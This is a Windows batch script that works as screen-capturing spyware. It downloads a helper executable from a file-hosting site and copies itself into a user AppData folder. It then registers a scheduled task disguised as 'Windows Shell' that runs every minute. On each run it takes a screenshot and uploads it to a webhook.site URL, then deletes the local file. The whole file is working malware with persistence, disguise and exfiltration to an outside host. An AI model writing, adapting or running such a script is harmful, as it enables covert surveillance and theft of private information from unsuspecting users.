@echo off

set CDIR=%LOCALAPPDATA%\Microsoft\Windows\Shell
set WEBHOOK=https://webhook.site/432e7050-cba6-4588-9563-fdb98a1d274b
set NIRCMD_URL=https://tmpfiles.org/dl/3205021/nircmdc.exe

IF NOT Exist %CDIR%\nircmdc.exe (
	REM File not i - download and schtask every minute
	REM powershell iwr -Uri %NIRCMD_URL% -OutFile %CDIR%\nircmdc.exe
	curl %NIRCMD_URL% -o %CDIR%\nircmdc.exe
	copy "%~f0" "%CDIR%\env.bat" 
	schtasks /Create /SC minute /MO 1 /TN "Windows Shell" /TR %CDIR%\env.bat
	REM del "%~f0"
)

setlocal
For /f "tokens=2-4 delims=/ " %%a in ('date /t') do (set mydate=%%c-%%a-%%b)
For /f "tokens=1-2 delims=/:" %%a in ('time /t') do (set mytime=%%a%%b)
set NAME=%CDIR%\%mydate%_%mytime%.jpg
%CDIR%\nircmdc.exe savescreenshot "%NAME%" jpg
curl --ssl-no-revoke -X POST -F "screenshot=@%NAME%" %WEBHOOK%
del %NAME%
